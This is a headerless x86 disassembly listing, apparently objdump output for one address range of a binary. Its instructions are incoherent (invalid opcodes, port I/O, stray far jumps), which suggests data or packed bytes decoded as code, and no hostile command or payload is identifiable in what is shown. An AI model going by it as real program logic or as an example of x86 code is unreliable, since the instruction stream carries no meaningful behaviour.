  413e11:	cmp    BYTE PTR [esi+0x5f2a5115],ah
  413e17:	es pop es
  413e19:	xchg   ebp,eax
  413e1a:	imul   edx,DWORD PTR [eax+edi*8],0x27
  413e1e:	fdiv   DWORD PTR [eax-0x2c]
  413e21:	xchg   esp,eax
  413e22:	ins    DWORD PTR es:[edi],dx
  413e23:	shr    BYTE PTR [edi],0x97
  413e26:	cmp    DWORD PTR ds:0x12497c3c,ecx
  413e2c:	add    eax,0x393b02f7
  413e31:	add    edi,ebx
  413e33:	jnp    0x413ea8
  413e35:	cs ret 0x6428
  413e39:	xor    BYTE PTR [ebx+0x7b],al
  413e3c:	in     eax,0x73
  413e3e:	into   
  413e3f:	lds    esp,FWORD PTR [esi]
  413e41:	es ret 0x1eaf
  413e45:	out    0x9d,eax
  413e47:	ins    BYTE PTR es:[edi],dx
  413e48:	stc    
  413e49:	xor    DWORD PTR [ebx+0x46],edi
  413e4c:	sub    ebp,DWORD PTR [esi+ebp*4+0x3e4870ab]
  413e53:	aas    
  413e54:	mov    BYTE PTR [edi-0x47fd810],al
  413e5a:	jle    0x413e81
  413e5c:	add    BYTE PTR [edx-0x4b],ah
  413e5f:	sub    esp,DWORD PTR [ebx]
  413e61:	push   ebx
  413e62:	retf   0xb991
  413e65:	pop    ebp
  413e66:	adc    bh,BYTE PTR [eax]
  413e68:	xlat   BYTE PTR ds:[ebx]
  413e69:	jmp    0xa6c94540
  413e6e:	fld    DWORD PTR [edx-0x43]
  413e71:	cmp    ebx,DWORD PTR [edx+0x398b41f2]
  413e77:	pop    es
  413e78:	in     al,dx
  413e79:	jno    0x413ee5
  413e7b:	cmp    DWORD PTR [edi+0x426fba68],ebx
  413e81:	mov    edx,DWORD PTR [ebx-0x6325dd38]
  413e87:	xor    al,0xf1
  413e89:	(bad)  
  413e8a:	pop    ebp
  413e8b:	inc    edi
  413e8c:	push   ecx
  413e8d:	add    eax,DWORD PTR [eax-0x49]
  413e90:	push   ds
  413e91:	pop    ds
  413e92:	jnp    0x413e52
  413e94:	(bad)  
  413e95:	in     al,dx
  413e96:	jp     0x413f0a
  413e98:	adc    eax,0xe3128dbf
  413e9d:	repnz inc ebp
  413e9f:	or     eax,0xdb5cf693
  413ea4:	dec    ecx
  413ea5:	fst    DWORD PTR [esi-0x3f]
  413ea8:	jmp    0xe17c:0x6b18085f
  413eaf:	stos   DWORD PTR es:[edi],eax
  413eb0:	cdq    
  413eb1:	fs aas 
  413eb3:	adc    ebp,DWORD PTR [edx+eiz*1+0xb]
  413eb7:	xor    esi,DWORD PTR [ebx-0x80]
  413eba:	pop    edx
  413ebb:	aaa    
  413ebc:	retf   
  413ebd:	pop    ecx
  413ebe:	adc    BYTE PTR [eax+edi*4],cl
  413ec1:	jbe    0x413e83
  413ec3:	sub    DWORD PTR [ecx+0x3a],edi
  413ec6:	xor    BYTE PTR ds:0xfc5504a4,cl
  413ecc:	jl     0x413ee8
  413ece:	xchg   esp,eax
  413ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ed0:	cmp    eax,0x98600874
  413ed5:	push   ecx
  413ed6:	inc    esp
  413ed7:	das    
  413ed8:	nop
  413ed9:	jmp    0xc78ea883
  413ede:	in     al,dx
  413edf:	pop    esi
  413ee0:	and    eax,0xca6bef45
  413ee5:	mov    ds:0x31e79edc,eax
  413eea:	push   DWORD PTR [ebx]
  413eec:	add    al,0xf5
  413eee:	jmp    0xbc8e7628
  413ef3:	es cdq 
  413ef5:	sbb    eax,0x3f5f2bbe
  413efa:	xchg   DWORD PTR [esi],ebp
  413efc:	sbb    BYTE PTR [edi-0x1e70dd4a],dh
  413f02:	jl     0x413f67
  413f04:	jge    0x413ee3
  413f06:	xor    BYTE PTR [edx-0x73],0xaa
  413f0a:	out    dx,eax
  413f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f0c:	jo     0x413f1f
  413f0e:	shl    DWORD PTR [esi+0x7f079ec8],1
  413f14:	imul   dh
  413f16:	test   al,0x8d
  413f18:	out    0xfa,al
  413f1a:	add    eax,0xcb58c822
  413f1f:	mov    eax,0xacc6963e
  413f24:	xor    eax,0xfa704059
  413f29:	stos   DWORD PTR es:[edi],eax
  413f2a:	sub    eax,0x1248c0e3
  413f2f:	inc    ebp
  413f30:	clc    
  413f31:	inc    eax
  413f32:	push   DWORD PTR [eax+esi*2+0x3149f56f]
  413f39:	cdq    
  413f3a:	mov    DWORD PTR ds:0x2862aedc,ebp
  413f40:	mov    esi,0x25394259
  413f45:	mov    DWORD PTR [ecx+0x22],esp
  413f48:	add    DWORD PTR [eax-0x66],ebp
  413f4b:	mov    ah,0x7
  413f4d:	mov    al,ds:0xfdd70d8e
  413f52:	cmp    ecx,edx
  413f54:	cmp    eax,0xa9f7b680
  413f59:	ins    DWORD PTR es:[edi],dx
  413f5a:	dec    edi
  413f5b:	or     ebp,DWORD PTR [ebx]
  413f5d:	cs loope 0x413f0c
  413f60:	mov    bh,0x64
  413f62:	cmp    DWORD PTR [ecx-0x33a3b540],ebp
  413f68:	int    0xc5
  413f6a:	or     esi,esp
  413f6c:	cdq    
  413f6d:	cdq    
  413f6e:	sbb    DWORD PTR [ebx-0x742635c8],eax
  413f74:	neg    DWORD PTR [ebx+ebp*8+0x764fcc33]
  413f7b:	int3   
  413f7c:	pop    esi
  413f7d:	xchg   ebp,eax
  413f7e:	sub    eax,0xa5cff1ea
  413f83:	or     DWORD PTR [esi-0x39],ecx
  413f86:	jmp    0x306fac76
  413f8b:	dec    ebp
  413f8c:	sub    BYTE PTR [ebp-0x5bd6dbab],bh
  413f92:	repz mov cl,0x20
  413f95:	pop    edx
  413f96:	jg     0x413f39
  413f98:	mov    DWORD PTR ds:0xf611697e,ebx
  413f9e:	addr16 (bad) 
  413fa0:	in     al,0x2
  413fa2:	iret   
  413fa3:	mov    ds:0x6f11e0e0,eax
  413fa8:	mov    bl,0x61
  413faa:	cli    
  413fab:	bound  ebx,QWORD PTR [ebp-0x7b]
  413fae:	popa   
  413faf:	in     al,dx
  413fb0:	cli    
  413fb1:	or     BYTE PTR [edx+0x4c],ah
  413fb4:	lods   al,BYTE PTR ds:[esi]
  413fb5:	aaa    
  413fb6:	push   ecx
  413fb7:	jle    0x41400b
  413fb9:	pusha  
  413fba:	mov    bl,0x1c
  413fbc:	pop    es
  413fbd:	xchg   ecx,eax
  413fbe:	add    DWORD PTR [ebx+0x7ec10052],esp
  413fc4:	mov    ebx,0xd4e2e51c
  413fc9:	mov    edi,0xf60c666a
  413fce:	or     al,0x3f
  413fd0:	push   eax
  413fd1:	ss ds or DWORD PTR gs:[ebx-0x6e22fbd7],eax
  413fda:	(bad)  
  413fdc:	xor    esi,DWORD PTR [esp+ebp*1+0x63]
  413fe0:	or     esi,edi
  413fe2:	mov    al,ds:0xa9d707e
  413fe7:	jo     0x414000
  413fe9:	std    
  413fea:	iret   
  413feb:	into   
  413fec:	jl     0x41403d
  413fee:	sub    al,0x7d
  413ff0:	cli    
  413ff1:	sbb    dl,BYTE PTR [ecx+eiz*8+0xc518197]
  413ff8:	ret    
  413ff9:	dec    edi
  413ffa:	in     al,dx
  413ffb:	adc    BYTE PTR [edi-0x600173e8],cl
  414001:	mov    dl,0x4e
  414003:	xchg   ecx,eax
  414004:	xchg   edx,eax
  414005:	sub    eax,0xf1d38f3d
  41400a:	ins    DWORD PTR es:[edi],dx
  41400b:	sbb    DWORD PTR [edx],ebx
  41400d:	or     al,0x3e
  41400f:	iret   
  414010:	xor    eax,0xc349b8ba
  414015:	sub    BYTE PTR [ebx-0x58a92590],al
  41401b:	lea    ebp,[ebp+0x2d1380a2]
  414021:	jbe    0x41400a
  414023:	and    bl,ah
  414025:	jae    0x41404e
  414027:	mov    ebp,0xe3e8b28a
  41402c:	mov    edi,0x5decf6da
  414031:	cmp    dh,BYTE PTR [ebx-0x67af2fbc]
  414037:	sub    DWORD PTR [ecx],edi
  414039:	stos   BYTE PTR es:[edi],al
  41403a:	test   DWORD PTR [ebp-0x48860aa2],edx
  414040:	out    dx,eax
  414041:	add    cl,ch
  414043:	sbb    eax,0xc94a081a
  414048:	(bad)  
  414049:	bound  edx,QWORD PTR [eax]
  41404b:	pop    ss
  41404c:	add    al,0x19
  41404e:	inc    ecx
  41404f:	mov    ds:0xcc993bde,al
  414054:	and    eax,0xfb30d9a3
  414059:	mov    cl,0x67
  41405b:	xchg   esp,eax
  41405c:	xor    BYTE PTR [ebx],0xdb
  41405f:	pop    eax
  414060:	dec    edi
  414061:	add    DWORD PTR [ebx+0x4c],ebx
  414064:	repnz mul DWORD PTR [esi-0x650019f4]
  41406b:	fs stos DWORD PTR es:[edi],eax
  41406d:	pop    ss
  41406e:	sub    ch,ah
  414070:	cmp    BYTE PTR [eax+0x18],al
  414073:	or     bl,BYTE PTR [eax+ebx*2]
  414076:	adc    DWORD PTR [ebp-0x6d],edx
  414079:	add    edi,DWORD PTR [ebx-0x46b80f03]
  41407f:	and    eax,0x6bd7f56a
  414084:	mov    ebx,0x94c8879f
  414089:	addr16 jmp 0x414046
  41408c:	enter  0x5b08,0xa7
  414090:	cmp    ch,bh
  414092:	pop    eax
  414093:	ins    BYTE PTR es:[edi],dx
  414094:	inc    esp
  414095:	cwde   
  414096:	jp     0x41408f
  414098:	sbb    BYTE PTR ds:0x535b5613,0x8e
  41409f:	jno    0x41410f
  4140a1:	dec    ebp
  4140a2:	ror    DWORD PTR [ecx],1
  4140a4:	stos   BYTE PTR es:[edi],al
  4140a5:	jae    0x414091
  4140a7:	xchg   edi,eax
  4140a8:	aaa    
  4140a9:	popf   
  4140aa:	inc    ebp
  4140ab:	sahf   
  4140ac:	rcl    DWORD PTR [edx-0x4f],1
  4140af:	ret    0x3524
  4140b2:	iret   
  4140b3:	pusha  
  4140b4:	fcomp  DWORD PTR [ebx+0x49781f40]
  4140ba:	mov    al,0x93
  4140bc:	push   eax
  4140bd:	cmp    DWORD PTR [esi+0xc],esp
  4140c0:	jl     0x4140f4
  4140c2:	adc    BYTE PTR [esi-0x48ff673e],ch
  4140c8:	xchg   edi,eax
  4140c9:	arpl   WORD PTR [eax],bx
  4140cb:	ja     0x414089
  4140cd:	stos   DWORD PTR es:[edi],eax
  4140ce:	adc    BYTE PTR [edx],cl
  4140d0:	stos   BYTE PTR es:[edi],al
  4140d1:	call   0xc20bddc7
  4140d6:	and    esi,eax
  4140d8:	push   es
  4140d9:	push   esi
  4140da:	unpckhps xmm2,XMMWORD PTR [eax-0x3a]
  4140de:	sub    eax,0xa3aa6b65
  4140e3:	imul   ecx,DWORD PTR [edi+0x18d097],0xa571fd5a
  4140ed:	jnp    0x414149
  4140ef:	sub    DWORD PTR [ebx],ebp
  4140f1:	lea    edx,[esi-0x671151c]
  4140f7:	add    DWORD PTR [esi-0x368e0c6c],edx
  4140fd:	mov    ebp,0x26eba44d
  414102:	push   ebp
  414103:	mov    ds:0xad55d6b,eax
  414108:	inc    ebp
  414109:	(bad)  
  41410a:	push   ebp
  41410b:	lahf   
  41410c:	inc    edx
  41410d:	sub    DWORD PTR [ecx-0x58],eax
  414110:	mov    edx,0xf4f0e8bd
  414115:	repz jb 0x414146
  414118:	sub    eax,0x4ac22bbb
  41411d:	add    DWORD PTR [esi-0x10acdef6],eax
  414123:	xlat   BYTE PTR ds:[ebx]
  414124:	idiv   DWORD PTR [eax]
  414126:	popa   
  414127:	xchg   edx,eax
  414128:	in     al,dx
  414129:	mov    ebp,0xa4874482
  41412e:	icebp  
  41412f:	sbb    BYTE PTR [edx-0x26e67a4d],dl
  414135:	nop
  414136:	pusha  
  414137:	popf   
  414138:	cmc    
  414139:	push   edx
  41413a:	in     eax,0x32
  41413c:	cdq    
  41413d:	fldcw  WORD PTR [ecx-0x3e]
  414140:	lds    ebx,FWORD PTR [edi+0x7e]
  414143:	add    ecx,DWORD PTR [edx-0x4ea06238]
  414149:	call   0xccc66b79
  41414e:	mov    bl,BYTE PTR [ecx+0x31cef7cf]
  414154:	sbb    eax,0x37230451
  414159:	push   esp
  41415a:	adc    ebx,0xfffffff1
  41415d:	sahf   
  41415e:	(bad)  
  41415f:	gs push 0xffffffc1
  414162:	mov    al,bl
  414164:	push   edx
  414165:	addr16 cs out dx,eax
  414168:	data16 mov ah,0x5c
  41416b:	inc    esi
  41416c:	and    eax,0xca9b3d01
  414171:	xchg   edx,eax
  414172:	inc    esi
  414173:	push   DWORD PTR [ecx-0x45a4c24f]
  414179:	jle    0x414165
  41417b:	and    BYTE PTR [eax+0x0],dh
  41417e:	dec    ebx
  41417f:	fdivp  st(6),st
  414181:	hlt    
  414182:	lds    eax,FWORD PTR [esi-0x728d8a92]
  414188:	mov    bl,0xa6
  41418a:	imul   eax,DWORD PTR [edx+edx*4+0x6f],0x3b
  41418f:	inc    edi
  414190:	test   esp,0xe8c0e03d
  414196:	idiv   DWORD PTR ds:0x262506aa
  41419c:	mov    DWORD PTR [ecx-0x3d],ecx
  41419f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141a0:	xchg   esi,eax
  4141a1:	push   esi
  4141a2:	(bad)  
  4141a3:	push   esi
  4141a4:	fisubr DWORD PTR [bx]
  4141a7:	jmp    0x414159
  4141a9:	push   edx
  4141aa:	mov    esp,0xe3a992dd
  4141af:	xor    al,bl
  4141b1:	rol    DWORD PTR [edx-0x69],0x8a
  4141b5:	cmp    BYTE PTR [eax],ch
  4141b7:	shr    DWORD PTR [ecx],cl
  4141b9:	data16 sbb BYTE PTR [eax+eiz*1],0xc3
  4141be:	add    DWORD PTR [eax+ebp*8+0xb],edx
  4141c2:	or     BYTE PTR [edx],bl
  4141c4:	inc    eax
  4141c5:	jmp    0x5c434978
  4141ca:	and    al,dh
  4141cc:	ss es gs test eax,0x64285654
  4141d4:	mov    bl,0x8b
  4141d6:	xor    al,0x9d
  4141d8:	xor    al,0x2a
  4141da:	loop   0x4141f0
  4141dc:	push   eax
  4141dd:	jl     0x41422f
  4141df:	sbb    WORD PTR [eax+0x4c5ef426],bp
  4141e6:	pop    esp
  4141e7:	mov    BYTE PTR [eax+0x3b],ah
  4141ea:	lods   eax,DWORD PTR ds:[esi]
  4141eb:	add    eax,0xbf6b9cc
  4141f0:	fstp   DWORD PTR [ebx]
  4141f2:	pop    eax
  4141f3:	cld    
  4141f4:	adc    BYTE PTR [eax],0x4b
  4141f7:	imul   eax,DWORD PTR [eax+eax*4+0x9],0x2dfd3fc3
  4141ff:	xlat   BYTE PTR ds:[ebx]
  414200:	sub    dh,BYTE PTR [esi+0x27a14462]
  414206:	push   ds
  414207:	sahf   
  414208:	add    BYTE PTR [ecx+ecx*8],al
  41420b:	xor    ebx,ebx
  41420d:	jg     0x414192
  41420f:	imul   dl
  414211:	inc    ebx
  414212:	shl    BYTE PTR [edi-0xd759a4d],1
  414218:	scas   al,BYTE PTR es:[edi]
  414219:	xchg   ebp,eax
  41421a:	rcr    DWORD PTR [eax],cl
  41421c:	pop    ebp
  41421d:	and    al,0x7e
  41421f:	cmp    BYTE PTR [ebp-0x67],dh
  414222:	pop    es
  414223:	sti    
  414224:	out    dx,eax
  414225:	mov    ds:0x93adc521,al
  41422a:	cwde   
  41422b:	sbb    DWORD PTR ds:0x9ffa4f94,ebx
  414231:	arpl   ax,sp
  414233:	xor    al,0xf9
  414235:	pushf  
  414236:	jp     0x4141da
  414238:	cs jo  0x41425d
  41423b:	imul   ebp,DWORD PTR [ebx+ebx*8-0x307fcfd0],0xffffffb7
  414243:	push   ss
  414244:	div    cl
  414246:	test   eax,0xe04f392b
  41424b:	sub    ah,bh
  41424d:	stc    
  41424e:	add    eax,ebx
  414250:	loope  0x414293
  414252:	sti    
  414253:	inc    esi
  414254:	add    bl,dl
  414256:	sbb    esp,DWORD PTR [esi-0x3cf67e2f]
  41425c:	jno    0x41421f
  41425e:	mov    al,ds:0x770e6bd5
  414263:	mov    dh,0x8e
  414265:	addr16 dec ecx
  414267:	hlt    
  414268:	push   esi
  414269:	ret    0x6f8f
  41426c:	sub    bl,ch
  41426e:	lds    edi,FWORD PTR [ebx]
  414270:	lahf   
  414271:	xor    DWORD PTR [esi],0x36
  414274:	adc    eax,0x6e540df6
  414279:	inc    ebx
  41427a:	pop    es
  41427b:	stos   BYTE PTR es:[edi],al
  41427c:	pop    esi
  41427d:	jb     0x41428c
  41427f:	dec    ebx
  414280:	into   
  414281:	arpl   WORD PTR [eax],cx
  414283:	mov    ebx,0x4761597c
  414288:	sti    
  414289:	cwde   
  41428a:	sub    al,0x21
  41428c:	push   ds
  41428d:	mov    BYTE PTR [edi],ah
  41428f:	adc    edx,edi
  414291:	lods   al,BYTE PTR ds:[esi]
  414292:	ret    0x1a55
  414295:	xchg   edi,eax
  414296:	stos   BYTE PTR es:[edi],al
  414297:	shl    dh,0xf4
  41429a:	mov    al,0x60
  41429c:	pop    ds
  41429d:	das    
  41429e:	cld    
  41429f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a0:	or     ah,BYTE PTR [eax]
  4142a2:	es js  0x4142a4
  4142a5:	pop    ss
  4142a6:	repnz dec edx
  4142a8:	dec    ebp
  4142a9:	adc    bl,BYTE PTR [esp+ebx*4+0x20]
  4142ad:	dec    ecx
  4142ae:	xor    al,0xd3
  4142b0:	jns    0x4142ff
  4142b2:	out    0x1e,eax
  4142b4:	push   edi
  4142b5:	push   eax
  4142b6:	inc    edi
  4142b7:	aaa    
  4142b8:	and    eax,0xc7031beb
  4142bd:	stos   DWORD PTR es:[edi],eax
  4142be:	push   0xffffffb3
  4142c0:	push   ecx
  4142c1:	pop    ds
  4142c2:	lahf   
  4142c3:	push   es
  4142c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142c5:	mov    ch,0x49
  4142c7:	and    esp,DWORD PTR [ecx-0x2b8b40ea]
  4142cd:	dec    ecx
  4142ce:	xchg   DWORD PTR [edi-0x5bc17cda],edx
  4142d4:	stos   DWORD PTR es:[edi],eax
  4142d5:	pop    esp
  4142d6:	mov    ah,0x44
  4142d8:	jnp    0x414327
  4142da:	test   dl,cl
  4142dc:	sahf   
  4142dd:	mov    ecx,0xa8dbe136
  4142e2:	nop
  4142e3:	shl    BYTE PTR [esi],1
  4142e5:	ins    DWORD PTR es:[edi],dx
  4142e6:	cdq    
  4142e7:	ins    DWORD PTR es:[edi],dx
  4142e8:	push   cs
  4142e9:	sbb    esi,edx
  4142eb:	popa   
  4142ec:	jo     0x4142cb
  4142ee:	out    dx,eax
  4142ef:	add    al,0x5
  4142f1:	mov    ds:0xcf547265,eax
  4142f6:	fcmove st,st(1)
  4142f8:	test   eax,0xea5d6219
  4142fd:	push   ebp
  4142fe:	fsubr  QWORD PTR [eax+0x587ca444]
  414304:	xchg   edx,eax
  414305:	fs sub al,0xd3
  414308:	jp     0x414386
  41430a:	add    BYTE PTR [edi],al
  41430c:	sub    eax,0x731dccd0
  414311:	call   0xc3aa0e53
  414316:	aad    0x4d
  414318:	fmul   QWORD PTR [edi]
  41431a:	and    BYTE PTR [esi+edi*2],al
  41431d:	dec    edx
  41431e:	ja     0x4142b3
  414320:	or     eax,0x269a81d0
  414325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414326:	test   al,0x39
  414328:	push   ecx
  414329:	out    0xc5,eax
  41432b:	in     al,dx
  41432c:	ins    BYTE PTR es:[edi],dx
  41432d:	int    0xec
  41432f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414330:	daa    
  414331:	ds int 0xa9
  414334:	je     0x414310
  414336:	stc    
  414337:	dec    ebx
  414338:	aas    
  414339:	retf   
  41433a:	scas   eax,DWORD PTR es:[edi]
  41433b:	dec    eax
  41433c:	lahf   
  41433d:	fabs   
  41433f:	xchg   ecx,eax
  414340:	iret   
  414341:	pop    esp
  414342:	push   ss
  414343:	rcr    BYTE PTR [ecx-0x46],1
  414346:	es leave 
  414348:	jmp    0x4143b8
  41434a:	aas    
  41434b:	(bad)  
  41434d:	inc    ebx
  41434e:	fidiv  WORD PTR [eax+0x15e4d1d9]
  414354:	mov    eax,ecx
  414356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414357:	int3   
  414358:	or     DWORD PTR [eax+0x66],esp
  41435b:	push   0x67
  41435d:	pushf  
  41435e:	inc    edx
  41435f:	dec    esp
  414360:	jle    0x4143a2
  414362:	sub    DWORD PTR [ebx+0x6e0a528d],eax
  414368:	mov    ch,0xf7
  41436a:	fwait
  41436b:	inc    ecx
  41436c:	sub    al,0xf1
  41436e:	sub    edi,edx
  414370:	mov    dl,0x83
  414372:	sub    DWORD PTR [ecx+0x65],ecx
  414375:	(bad)  
  414377:	mov    ecx,0x691d3807
  41437c:	aaa    
  41437d:	mov    bh,0xb9
  41437f:	sti    
  414380:	and    ebp,ebx
  414382:	inc    edx
  414383:	daa    
  414384:	sti    
  414385:	repz lea esp,[edi]
  414388:	mov    esp,0xfeac1e3a
  41438d:	lea    ecx,[ecx-0x11a77ed3]
  414393:	jbe    0x4143d0
  414395:	cmp    edi,edi
  414397:	push   es
  414398:	xor    DWORD PTR [edx-0x5c80a401],ecx
  41439e:	fdiv   st(6),st
  4143a0:	and    eax,0xb7f665c5
  4143a5:	cdq    
  4143a6:	scas   al,BYTE PTR es:[edi]
  4143a7:	mov    ch,0x90
  4143a9:	je     0x414402
  4143ab:	sub    BYTE PTR [ecx-0x50],0xb4
  4143af:	pushf  
  4143b0:	pop    ebx
  4143b1:	outs   dx,DWORD PTR ds:[esi]
  4143b2:	pop    ss
  4143b3:	retf   
  4143b4:	shl    DWORD PTR [ecx+0x39],0xe8
  4143b8:	aas    
  4143b9:	pop    edi
  4143ba:	stos   BYTE PTR es:[edi],al
  4143bb:	aas    
  4143bc:	das    
  4143bd:	arpl   ax,di
  4143bf:	retf   0xbb60
  4143c2:	cmp    eax,DWORD PTR [eax]
  4143c4:	jmp    edx
  4143c6:	push   esp
  4143c7:	jns    0x4143ee
  4143c9:	fwait
  4143ca:	xchg   edi,eax
  4143cb:	ins    DWORD PTR es:[edi],dx
  4143cc:	sub    ecx,DWORD PTR [esi+esi*2]
  4143cf:	cli    
  4143d0:	xchg   esp,eax
  4143d1:	das    
  4143d2:	jbe    0x414442
  4143d4:	jne    0x414393
  4143d6:	or     DWORD PTR ds:0xcbf6d249,eax
  4143dc:	xor    DWORD PTR [eax+ecx*4+0x435ee25a],eax
  4143e3:	shl    bh,1
  4143e5:	mov    al,0x89
  4143e7:	mov    eax,0xd8215388
  4143ec:	cmp    eax,0x8cecf161
  4143f1:	xchg   ecx,eax
  4143f2:	lods   eax,DWORD PTR ds:[esi]
  4143f3:	mov    ds:0x7a057685,al
  4143f8:	push   esp
  4143f9:	ficomp WORD PTR [edx]
  4143fb:	rcl    BYTE PTR [ecx+0x66110e5c],0x0
  414402:	shl    BYTE PTR [ebx],cl
  414404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414405:	clc    
  414406:	ins    BYTE PTR es:[edi],dx
  414407:	or     al,0x6b
  414409:	push   cs
  41440a:	adc    esi,DWORD PTR [ecx-0x2c0c8a63]
  414410:	pop    ebx
  414411:	les    edi,FWORD PTR [ebx]
  414413:	out    dx,eax
  414414:	mov    al,ds:0xff7a1506
  414419:	lea    edi,[edx-0x525a08d7]
  41441f:	pop    edi
  414420:	mov    al,0xab
  414422:	push   ecx
  414423:	mov    eax,ds:0x86894be1
  414428:	in     eax,dx
  414429:	clc    
  41442a:	or     al,0x97
  41442c:	xor    BYTE PTR cs:[edx+0x32dde6e7],cl
  414433:	mul    dl
  414435:	jns    0x4143e7
  414437:	mov    bl,0x6b
  414439:	push   cs
  41443a:	stc    
  41443b:	shl    DWORD PTR [ebp-0xe],1
  41443e:	cmc    
  41443f:	push   DWORD PTR [edx+0x31]
  414442:	cmc    
  414443:	add    DWORD PTR [edx+0x73af7cb1],ecx
  414449:	pop    ss
  41444a:	sti    
  41444b:	pop    esi
  41444c:	(bad)  
  41444d:	aam    0xd
  41444f:	ret    0x8e72
  414452:	retf   
  414453:	aas    
  414454:	fwait
  414455:	or     edx,DWORD PTR [eax+eax*2]
  414458:	and    ecx,esp
  41445a:	inc    esp
  41445b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41445c:	jg     0x41445d
  41445e:	xor    eax,0xf04a5baa
  414463:	outs   dx,DWORD PTR ds:[esi]
  414464:	(bad)  
  414465:	fs mov ebx,0x4bf7ef5e
  41446b:	les    ebp,FWORD PTR [esi]
  41446d:	dec    edi
  41446e:	mov    esi,0xab7e8872
  414473:	mov    al,0x3b
  414475:	out    dx,eax
  414476:	mov    ds:0x843bd488,al
  41447b:	dec    ebx
  41447c:	xchg   ebp,eax
  41447d:	ins    BYTE PTR es:[edi],dx
  41447e:	(bad)  
  41447f:	outs   dx,DWORD PTR ds:[esi]
  414480:	pusha  
  414481:	imul   ebx,DWORD PTR [eax-0x28],0xbc59668d
  414488:	mov    ds:0x4a999d63,al
  41448d:	xchg   ebx,eax
  41448e:	add    ebp,DWORD PTR [esi]
  414490:	push   ecx
  414491:	mov    ss,edi
  414493:	and    al,0xf8
  414495:	arpl   si,bx
  414497:	sub    DWORD PTR [edi],edx
  414499:	(bad)  
  41449a:	fsubp  st(3),st
  41449c:	(bad)  
  41449d:	fidiv  DWORD PTR [edx+edx*8-0x249b3c29]
  4144a4:	cmp    bh,BYTE PTR [eax]
  4144a6:	sub    eax,0x9b9a157
  4144ab:	lods   al,BYTE PTR ds:[esi]
  4144ac:	ja     0x414466
  4144ae:	and    cl,BYTE PTR [ecx]
  4144b0:	or     al,0x16
  4144b2:	xchg   BYTE PTR [ecx-0x76],dh
  4144b5:	pop    eax
  4144b6:	xchg   BYTE PTR [esi-0x5a],bl
  4144b9:	mov    ss,WORD PTR [esi+0x20b6c0e3]
  4144bf:	js     0x4144de
  4144c1:	cwde   
  4144c2:	inc    edx
  4144c3:	mov    al,ds:0x87793409
  4144c8:	jecxz  0x4144af
  4144ca:	sub    al,0xd5
  4144cc:	dec    esp
  4144cd:	js     0x4144ae
  4144cf:	not    bh
  4144d1:	ja     0x4144b0
  4144d3:	jp     0x414481
  4144d5:	xor    BYTE PTR [ecx+0x5f],bl
  4144d8:	pop    es
  4144d9:	push   0x70
  4144db:	mov    edx,0xb104910f
  4144e0:	or     DWORD PTR ss:[edx+0x29],0x5ea9922b
  4144e8:	mov    al,0xfa
  4144ea:	mov    bh,0x7
  4144ec:	fnstcw WORD PTR [eax]
  4144ee:	add    DWORD PTR [ebx-0x8],eax
  4144f1:	call   0xb83b9f03
  4144f6:	xchg   esi,eax
  4144f7:	dec    esi
  4144f8:	pushf  
  4144f9:	ror    BYTE PTR [ebx],0x33
  4144fc:	sub    cl,dh
  4144fe:	pop    edi
  4144ff:	mov    al,ds:0x803f1de2
  414504:	push   ebp
  414505:	(bad)  
  414506:	jl     0x414557
  414508:	stos   BYTE PTR es:[edi],al
  414509:	or     esp,DWORD PTR [ebx+ecx*4]
  41450c:	mov    BYTE PTR [eax],ch
  41450e:	out    dx,eax
  41450f:	xchg   BYTE PTR [ebx],al
  414511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414512:	les    eax,FWORD PTR ds:0x33ac7f86
  414518:	and    BYTE PTR [esi-0x730e7a08],ah
  41451e:	sbb    BYTE PTR [esi],bh
  414520:	ror    BYTE PTR [esi+0x61],cl
  414523:	in     al,dx
  414524:	mov    dh,0xde
  414526:	cmp    bh,BYTE PTR [eax+ebx*2-0x234c87f9]
  41452d:	xor    eax,0x202283d6
  414532:	xor    al,0xbe
  414534:	mov    ds:0x383877c3,eax
  414539:	cld    
  41453a:	cs sti 
  41453c:	lahf   
  41453d:	sub    al,0x42
  41453f:	dec    eax
  414540:	jae    0x41451b
  414542:	sbb    al,0xa6
  414544:	sub    DWORD PTR [ecx],esi
  414546:	push   ebx
  414547:	lods   eax,DWORD PTR ds:[esi]
  414548:	aas    
  414549:	icebp  
  41454a:	pop    eax
  41454b:	ds cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41454e:	inc    esi
  41454f:	cmp    ebx,DWORD PTR [edx-0x5e]
  414552:	inc    edx
  414553:	adc    DWORD PTR [edx],edi
  414555:	add    ebp,DWORD PTR [edx-0x11]
  414558:	adc    al,0xb9
  41455a:	jmp    0x592c:0xf3ac2de6
  414561:	jbe    0x4145be
  414563:	gs (bad) 
  414565:	clc    
  414566:	inc    esi
  414567:	dec    esp
  414568:	jmp    0x1531102a
  41456d:	xor    bh,dl
  41456f:	jmp    0x4145b9
  414571:	xchg   edi,eax
  414572:	mov    eax,0x15894276
  414577:	pop    ss
  414578:	fistp  DWORD PTR ds:0xb8beec38
  41457e:	or     eax,DWORD PTR [eax-0x65]
  414581:	fld    st(5)
  414583:	jge    0x414576
  414585:	fisttp QWORD PTR [edi]
  414587:	cdq    
  414588:	add    ah,BYTE PTR [esi+0x19]
  41458b:	enter  0xb877,0x9f
  41458f:	leave  
  414590:	std    
  414591:	xchg   edi,eax
  414592:	in     eax,0xed
  414594:	xor    DWORD PTR [ebx-0x1e],eax
  414597:	push   ebx
  414598:	stos   DWORD PTR es:[edi],eax
  414599:	xchg   ecx,eax
  41459a:	das    
  41459b:	in     al,0x8f
  41459d:	push   eax
  41459e:	mov    cl,0xc8
  4145a0:	sub    BYTE PTR ds:0x4d86cb5f,0x5e
  4145a7:	dec    ebx
  4145a8:	inc    ebp
  4145a9:	push   0x54930e1c
  4145ae:	pop    ebp
  4145af:	dec    esi
  4145b0:	push   cs
  4145b1:	dec    eax
  4145b2:	shr    DWORD PTR [ecx],0x26
  4145b5:	pop    ebx
  4145b6:	sub    BYTE PTR [eax+0x24],ah
